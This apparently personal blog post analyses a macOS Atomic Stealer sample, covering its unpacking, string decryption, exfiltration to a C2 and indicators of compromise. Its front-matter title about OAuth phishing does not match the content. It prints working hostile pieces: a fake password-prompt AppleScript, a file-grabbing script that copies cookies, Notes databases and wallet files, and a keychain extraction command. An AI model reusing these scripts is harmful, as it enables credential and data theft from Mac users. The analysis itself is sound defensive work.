---
title:  "Phishing with OAuth Device Authorization Grant Flow"
authors: ["Italo Nofi"]
date:   2024-03-31
tags: ["phishing","oauth"]
thumbnail:
  url: img/2024-03-08-amos-atomic-macos-stealer-0.png
  author: Deep AI
  authorURL: https://deepai.org
---

Hello everybody, this is my first macOS malware analysis, I took a sample on [malwarebazaar](https://bazaar.abuse.ch/sample/08ff8a6500d623b062dcef8a2ef6fc141c1871f7a84b42f842d470fee26070c4/) and tryed to reverse it, the sample was uploaded by Cryptolaemus1 on 14 Feb 2024.

While analysing the second stage, it was clear that the sample is a variant of Atomic Stealer.

Atomic Stealer, as reported by [SentinelOne](https://www.sentinelone.com/blog/atomic-stealer-threat-actor-spawns-second-variant-of-macos-malware-sold-on-telegram/) is a macOS info stealer sold on Telegram, able to grab account data password, browser data, session cookies and crypto wallet.

The main behaviours are the same already well described by [RussianPanda](https://russianpanda.com/2024/01/15/Atomic-Stealer-AMOS/9).



## Stage One

The file downloaded from malwarebazaar is a dmg file called **application_v1.1.dmg**, I don't know where it came from but we can suppose that it was distributed as a fake program as reported by [Malwarebytes](https://www.malwarebytes.com/blog/threat-intelligence/2023/11/atomic-stealer-distributed-to-mac-users-via-fake-browser-updates).

The SHA-256 for the file is **08ff8a6500d623b062dcef8a2ef6fc141c1871f7a84b42f842d470fee26070c4**, obiviously it was already submitted on [VirusTotal](https://www.virustotal.com/gui/file/08ff8a6500d623b062dcef8a2ef6fc141c1871f7a84b42f842d470fee26070c4/detection).

{{< image src="img/2024-03-08-amos-atomic-macos-stealer-analysis/img1.png" caption="Figure 1 - Virus Total application_v1.1.dmg" wrapper="text-center">}}


The dmg contains the following files:

* .DS_Store
* .DropDMGBackground
* .fseventsd:
* AppleApp

{{< image src="img/2024-03-08-amos-atomic-macos-stealer-analysis/img2.png" caption="Figure 2 - application_v1.1.dmg Content" wrapper="text-center">}}


The Mach-O **AppleApp** file is reported as malicious by [VirusTotal](https://www.virustotal.com/gui/file/4ac7d15c8a397cd68ba9e7166b2e356175761bf4580d0e03e3db994c3ceda3fa), its SHA-256 is **4ac7d15c8a397cd68ba9e7166b2e356175761bf4580d0e03e3db994c3ceda3fa**

{{< image src="img/2024-03-08-amos-atomic-macos-stealer-analysis/img3.png" caption="Figure 3 - Virus Total AppleApp" wrapper="text-center">}}

The file is signed with an adhoc signature.

{{< image src="img/2024-03-08-amos-atomic-macos-stealer-analysis/img4.png" caption="Figure 4 - AppleApp adhoc Signature" wrapper="text-center">}}

When the dmg file is opened, it shows the following image requesting the user to right click and use the **open** option.

{{< image src="img/2024-03-08-amos-atomic-macos-stealer-analysis/img5.png" caption="Figure 5 - AppleApp Installation" wrapper="text-center">}}

When the the file is opened, it asks the user to enter his password.

{{< image src="img/2024-03-08-amos-atomic-macos-stealer-analysis/img6.png" caption="Figure 6 - Password Message Box" wrapper="text-center">}}


Let's try to reverse engineer the **AppleApp** Mach-O to understand what it does.

### Unpacking

The **main** function of the x64 AppleApp Mach-O,  creates and prints the string “**osascript -e 'tell application "Terminal" to close first windows& exit '**”, and executes a **fork**, after that the parent process exits while the child process executes **setsid**, the osascript via **system** and the **main2** function by running a new thread.

{{< image src="img/2024-03-08-amos-atomic-macos-stealer-analysis/img7.png" caption="Figure 7 - AppleApp Main Function" wrapper="text-center">}}


The **main2** function gets the user name by executing **getenv("USER")**, it decrypts an embedded Mach-O file using the **encryptDecrypt** function, writes the decrypted file to **/Users/USERNAME/exe**, then using **system** it executes **chmod +x** on the new created file to make it executable, then it runs the **exe** file via **system**, after that it sleeps for 1 seconds and deletes the **/Users/USERNAME/exe** file.

{{< image src="img/2024-03-08-amos-atomic-macos-stealer-analysis/img8.png" caption="Figure 8 - AppleApp Main2 Function" wrapper="text-center">}}


The **encryptDecrypt** function is a simple xor between the encrypted Mach-O file and the hardcoded key 0x13.

{{< image src="img/2024-03-08-amos-atomic-macos-stealer-analysis/img9.png" caption="Figure 9 - AppleApp encryptDecrypt Function" wrapper="text-center">}}

## Stage Two

The Mach-O **exe** file is reported as malicious by [VirusTotal](https://www.virustotal.com/gui/file/c802c94d0836039aa986e66200233bdf84a9f68512e7ba6d22e93ab679309d4a), its SHA-256 is c802c94d0836039aa986e66200233bdf84a9f68512e7ba6d22e93ab679309d4a.

{{< image src="img/2024-03-08-amos-atomic-macos-stealer-analysis/img10.png" caption="Figure 10 - Virus Total exe" wrapper="text-center">}}

The file is signed with an adhoc signature.

{{< image src="img/2024-03-08-amos-atomic-macos-stealer-analysis/img11.png" caption="Figure 11 - exe adhoc Signature" wrapper="text-center">}}

The **main** function is similar to the one of the AppleApp Mach-O, it creates and prints the string “**osascript -e 'tell application "Terminal" to close first windows& exit '**”, executes a **fork**, the parent process exits and the child process continue the execution. 

The child process executes **setsid**, and executes the osascript by using the **shellermy** function.

{{< image src="img/2024-03-08-amos-atomic-macos-stealer-analysis/img12.png" caption="Figure 12 - exe Main Function" wrapper="text-center">}}

The **shellermy** function is used to execute commands, it uses the  **popen** function, and then reads the command output using the **fread** functions as shown in the image below.

{{< image src="img/2024-03-08-amos-atomic-macos-stealer-analysis/img13.png" caption="Figure 13 - Shellermy Function" wrapper="text-center">}}

After this the malware executes several functions to steal informations and files from the system.


### Verify The User Password

The malware checks the user password by calling the **shellermy** function with the **dscl** command shown below as parameter.

~~~
dscl . authonly "username" "password"
~~~

If the password is valid the **dscl** command returns an empty response, otherwise the following message is returned.

{{< image src="img/2024-03-08-amos-atomic-macos-stealer-analysis/img14.png" caption="Figure 14 - Credential Validation Fails" wrapper="text-center">}}

The **haha_check_cv** function is used to validate the **dscl** command output, it returns 1 if the user password is valid, otherwise it returns 0. In the following screenshot, we can see the **haha_check_cv** function executes the **shellermy** function (with the **dscl** command as parameter), comparing the **shellermy** output (it is the **dscl** command output) and returns the flag value related to the credential validity.

{{< image src="img/2024-03-08-amos-atomic-macos-stealer-analysis/img15.png" caption="Figure 15 - haha_check_cv Credential Validation" wrapper="text-center">}} 

The first time the **dscl** command is executed with a blank password, if it fails, this means that the user has a password.

### Ask the User Password

The **getpasswordit** function is used to ask the user to enter his password by calling the **shellermy** function with the following osascript as parameter. If the user has a blank password, this function is not executed.

~~~
osascript -e 'display dialog "Required Application Helper. Please enter passphrase for USERNAME." default answer "" with icon caution buttons {"Continue"} default button "Continue" giving up after 150 with title "Application wants to install helper" with hidden answer'
~~~

After that, the malware executes the **dscl** command again to validate the credentials, this process will be executed until the user enters the correct password. The credentials check is done by the **haha_check_cv** function. 

The following screenshot of the **getpasswordit** function, shows the exit condition from the loop responsible to ask the user password, it breaks when the **haha_check_cv** returns 1.


{{< image src="img/2024-03-08-amos-atomic-macos-stealer-analysis/img16.png" caption="Figure 16 - User Password Loop" wrapper="text-center">}}


### Get System Information

The malware gets system information by executing the following command via **shellarmy**.

~~~
system_profiler SPSoftwareDataTye SPHardwareDataType SPDisplaysDataType
~~~

In the image below we can see a portion of the command result in the debugger.

{{< image src="img/2024-03-08-amos-atomic-macos-stealer-analysis/img17.png" caption="Figure 17 - System Information" wrapper="text-center">}}

At this point RussianPanda reportes an anti-vm check, in this sample this check is not implemented.

### Steal Data

The Malware uses several functions to steal files related to Browsers, Wallets and System data.

[RussiandPanda](https://russianpanda.com) and [BitDefender](https://www.bitdefender.com/blog/labs/when-stealers-converge-new-variant-of-atomic-stealer-in-the-wild/) reported the new version of the "**FileGrabber**" functionality used by the malware to grab several files and put them in the folder **~/fg/**. In their blogs, they showed the osascript used to do this.

In my sample  the **FileGrabber** osacript and the related string **FileGrabber** used to create the file in the zip, are both encrypted in the segment section at the following addresses:

* 0x10003DFE2
* 0x10003E0FA
* 0x10003E33A
* 0x10003E5CA
* 0x10003E8EA

These strings are decrypted during the malware execution, but the script itself is never executed. In the following snipet you can see the decrypted **FileGrabber** osascript.

~~~bash
osascript -e '
    set destinationFolderPath to (path to home folder as text) & "fg:"
    set extensionsList to {"txt","png","jpg","jpeg","wallet","keys","key"} 
    set bankSize to 0 
    tell application "Finder" 
    set username to short user name of (system info) 
    try 
        if not (exists folder destinationFolderPath) then 
            make new folder at (path to home folder) with properties {name:"fg"} 
        end if 
        set safariFolder to ((path to library folder from user domain as text) & "Containers:com.apple.Safari:Data:Library:Cookies:") 
        try 
            duplicate file "Cookies.binarycookies" of folder safariFolder to folder destinationFolderPath with replacing 
        end try 
        
        set notesFolderPath to (path to home folder as text) & "Library:Group Containers:group.com.apple.notes:" 
        try 
            set notesFolder to folder notesFolderPath 
            set notesFiles to {file "NoteStore.sqlite", file "NoteStore.sqlite-shm", file "NoteStore.sqlite-wal"} of notesFolder 
            repeat with aFile in notesFiles 
                set fileSize to size of aFile 
                if (bankSize + fileSize) < 10 * 1024 * 1024 then 
                    try 
                        duplicate aFile to folder destinationFolderPath with replacing 
                        set bankSize to bankSize + fileSize 
                    end try 
                else 
                    exit repeat 
                end if 
            end repeat 

        end try 
        
        set desktopFiles to every file of desktop 
        set documentsFiles to every file of folder "Documents" of (path to home folder) 
        repeat with aFile in (desktopFiles & documentsFiles) 
            set fileExtension to name extension of aFile 
            if fileExtension is in extensionsList then 
                set fileSize to size of aFile 
                if (bankSize + fileSize) < 10 * 1024 * 1024 then 
                    try 
                        duplicate aFile to folder destinationFolderPath with replacing 
                        set bankSize to bankSize + fileSize 
                    end try 
                else 
                    exit repeat 
                end if 
            end if 
        end repeat 
    end try 
end tell'

~~~

It looks like that the execution of the **FileGrabber** osascript was disabled, but the malware is still looking for the **~/fg/** folder when collecting informations. I suppose it was disabled in order to not save files on disk and to not allarm the user with an additional messagebox.


The **ChronosMasiter** function is used to find Chrome passwords in the keychain. It executes the following command by passing it as parameter to the **shellermy** function.

~~~
security 2>&1 > /dev/null find-generic-password -ga 'Chrome' | awk '{print $2}'
~~~

When the command is executed a system messagebox spawns because macOS wants the user to enter the password to access the keychain.

{{< image src="img/2024-03-08-amos-atomic-macos-stealer-analysis/img18.png" caption="Figure 18 - System Information" wrapper="text-center">}}

The **ChronosMasiter** functionality is executed only if the user has a blank password, I think it is a way to not allarm the user by asking for his password two times.

{{< image src="img/2024-03-08-amos-atomic-macos-stealer-analysis/img19.png" caption="Figure 19  - Call to ChronosMasiter" wrapper="text-center">}}

The **read_dir** function is used to open a directory and read its contents, it uses **stat**, **opendir** and the **readdir** functions as shown below.

{{< image src="img/2024-03-08-amos-atomic-macos-stealer-analysis/img20.png" caption="Figure 20 - Read Directory" wrapper="text-center">}}

The **rodwrote** function, is used to open and read files, it uses the **open** and the **read** functions, the file content is written into the zip using the **mz_zip_writer_add_mem_ex_v2** function.

{{< image src="img/2024-03-08-amos-atomic-macos-stealer-analysis/img21.png" caption="Figure 21 - rodwrote function" wrapper="text-center">}}




At this point the above functions are used to read folders and files, they are called by the following functions:

* **grab_this_folder_nahuy** : is responsible to steal Wallets data
* **grab_this_nahuy**: is responsible to steal Browser data 
* **getpw** : is responsible to steal data related to Chrome Wallets plugins 
* **pathfox**: is responsible to steal data related to Firefox

### String Encryption

All the strings are encrypted and are stored in the **const** segment, for example we can see the encrypted C2 string at address **0x10003DFCA**.

{{< image src="img/2024-03-08-amos-atomic-macos-stealer-analysis/img22.png" caption="Figure 22 - Encrypted C2 " wrapper="text-center">}}

The strings are not directly manipulated during the decryption process, they are copied in a **Thread Local Variables**(TLV) at offset **0x10**. 
For example in the image below a thread local variable is used to store the encrypted C2 strings.

{{< image src="img/2024-03-08-amos-atomic-macos-stealer-analysis/img23.png" caption="Figure 23 - Thead Local Variable with " wrapper="text-center">}}

After that the encrypted strings is xored with a hardcoded key that is incremented by 1 at each iteration, for example in the following snipet the **c2_thread_local_variable** variable is the address containing the Encrypted C2 string (at offset **0xA**), the **i** variable is just a counter incresed by 1 at each iteration and **0x77** is the hardcoded key.

{{< image src="img/2024-03-08-amos-atomic-macos-stealer-analysis/img24.png" caption="Figure 24 - XOR Operation" wrapper="text-center">}}

The hardcoded key is not the same for all the strings. The strings are basically the same reported by [RussianPanda](https://gist.github.com/RussianPanda95/c74ac42f58983d08ca50cedac960065a), you can find mine [here](https://gist.github.com/Syrion89/0253f808004bac873cad315ce6082f95)



### Data Exfiltration

The malware exfiltrates the stolen informations using a zip file that is filled everytime it reads informations (username, password, files), the malware uses the functions **mz_zip_writer_finalize_archive** and **mz_zip_writer_end_internal** to finalize the zip file. 

{{< image src="img/2024-03-08-amos-atomic-macos-stealer-analysis/img25.png" caption="Figure 25 - Zip Finalize" wrapper="text-center">}}

After that it executes the **sentfile** function to enstablish a connection to the C2 server and send a HTTP POST request containing the zip file.

{{< image src="img/2024-03-08-amos-atomic-macos-stealer-analysis/img26.png" caption="Figure 26 - POST HTTP Request to C2" wrapper="text-center">}}


The HTTP request has the two following headers with hardcoded values:

* uuid: 42b7baec-e6da-483a-b26c-0e9cb2579abf
* user: october

I dumped the zip file from the memory during an execution without any browser and wallet installed on the system, I found the following files related to the keychain, username, password and system informations.

{{< image src="img/2024-03-08-amos-atomic-macos-stealer-analysis/img27.png" caption="Figure 27 - Zip Files" wrapper="text-center">}}

As example the file user contains the following data.

{{< image src="img/2024-03-08-amos-atomic-macos-stealer-analysis/img28.png" caption="Figure 28 - User file content" wrapper="text-center">}}

## Conclusion

Analizyng known malwares is still an interesting activity because every sample may have different behaviours.

The use of **Thread Local Variable** to decrypt and use the strings is very interesting.

The decrypting process described differs from the one reported in other blogs, moreover this sample this requires only a minimum user interaction by disabling the **FileGrabber** functiontality and by using the **ChronosMasiter** function only if the user has a blank password.

Feel free to contact me, I’d appreciate any feedback.

## MITRE ATT&CK MATRIX

|TACTIC| TECHNIQUE|NAME|
|------|----------|-----|
|Reconnaissance|[T1592.001](https://attack.mitre.org/techniques/T1592/001)|Gather Victim Host Information: Hardware|
|Reconnaissance|[T1592.004](https://attack.mitre.org/techniques/T1592/004)|Gather Victim Host Information: Client Configurations|
|Reconnaissance|[T1589.001](https://attack.mitre.org/techniques/T1589/001)|Gather Victim Identity Information: Credentials|
|Resource Development|[T1583.008](https://attack.mitre.org/techniques/T1583/008)|Acquire Infrastructure: Malvertising|
|Initial Access|[TA0001](https://attack.mitre.org/tactics/TA0001)|Initial Access|
|Execution|[T1059.002](https://attack.mitre.org/techniques/T1059/002)|Command and Scripting Interpreter: AppleScript|
|Exeution|[T1059.004](https://attack.mitre.org/techniques/T1059/004)|Command and Scripting Interpreter: Unix Shell|
|Execution|[T1204.002](https://attack.mitre.org/techniques/T1204/002)|User Execution: Malicious File|
|Defense Evasion|[T1140](https://attack.mitre.org/techniques/T1140)|Deobfuscate/Decode Files or Information|
|Defense Evasion|[T1070.004](https://attack.mitre.org/techniques/T1070/004/)|Indicator Removal: File Deletion|
|Defense Evasion|[T1027.002](https://attack.mitre.org/techniques/T1027/002)|Obfuscated Files or Information: Software Packing|
|Defense Evasion|[T1027.009](https://attack.mitre.org/techniques/T1027/009)|Obfuscated Files or Information: Embedded Payloads|
|Credential Access|[T1555.001](https://attack.mitre.org/techniques/T1555/001)|Credentials from Password Stores: Keychain|
|Credential Access|[T1555.003](https://attack.mitre.org/techniques/T1555/003)|Credentials from Password Stores: Credentials from Web Browsers|
|Credential Access|[T1539](https://attack.mitre.org/techniques/T1539)|Steal Web Session Cookie|
|Discovery|[T1087](https://attack.mitre.org/techniques/T1087)|Account Discovery|
|Discovery|[T1217](https://attack.mitre.org/techniques/T1217)|Browser Information Discovery|
|Discovery|[T1083](https://attack.mitre.org/techniques/T1083)|File and Directory Discovery|
|Discovery|[T1082](https://attack.mitre.org/techniques/T1082)|System Information Discovery|
|Collection|[T1560.002](https://attack.mitre.org/techniques/T1560/002)|Archive Collected Data: Archive via Library|
|Collection|[T1119/](https://attack.mitre.org/techniques/T1119/) |Automated Collection
|Collection|[T1005](https://attack.mitre.org/techniques/T1005)|Data from Local System|
|Command and Control|[T1071.001/](https://attack.mitre.org/techniques/T1071/001)|Application Layer Protocol: Web Protocols|
|Exfiltration|[T1030](https://attack.mitre.org/techniques/T1030)|Data Transfer Size Limits|
|Exfiltration|[T1041](https://attack.mitre.org/techniques/T1041)|Exfiltration Over C2 Channel|


## Indicators of Compromise 

|CATEGORY|TYPE|VALUE
|---------------|---------------------------------|-------------------------------|
|DMG File |SHA256|08ff8a6500d623b062dcef8a2ef6fc141c1871f7a84b42f842d470fee26070c4|
|Mach-O File|SHA256|4ac7d15c8a397cd68ba9e7166b2e356175761bf4580d0e03e3db994c3ceda3fa|
|Mach-O File|SHA256*|c802c94d0836039aa986e66200233bdf84a9f68512e7ba6d22e93ab679309d4a|
|C2 | IP|5.42.64[.]114|








